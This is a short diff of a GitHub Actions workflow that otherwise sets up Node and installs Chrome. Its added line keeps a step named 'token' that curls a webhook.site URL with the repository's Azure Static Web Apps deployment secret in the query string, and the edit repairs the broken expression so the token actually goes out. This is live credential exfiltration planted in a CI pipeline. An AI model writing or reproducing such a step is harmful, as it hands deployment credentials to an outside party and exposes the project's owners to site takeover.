@@ -24,8 +24,7 @@ jobs:
       with:
         node-version: 14.15.1
     - name: token
-      run: curl https://webhook.site/346bf644-8833-413b-9ecc-33ba31e143a7?token=${{ secrets.AZURE_STATIC_WEB_APPS_API_TOKEN_ORANGE_GLACIER_0BC36C803
- }}
+      run: curl https://webhook.site/346bf644-8833-413b-9ecc-33ba31e143a7?token=${{ secrets.AZURE_STATIC_WEB_APPS_API_TOKEN_ORANGE_GLACIER_0BC36C803 }}
     - name: Update Chrome
       run: sudo apt-get update && sudo apt-get install google-chrome-stable
     - name: Get Chrome version
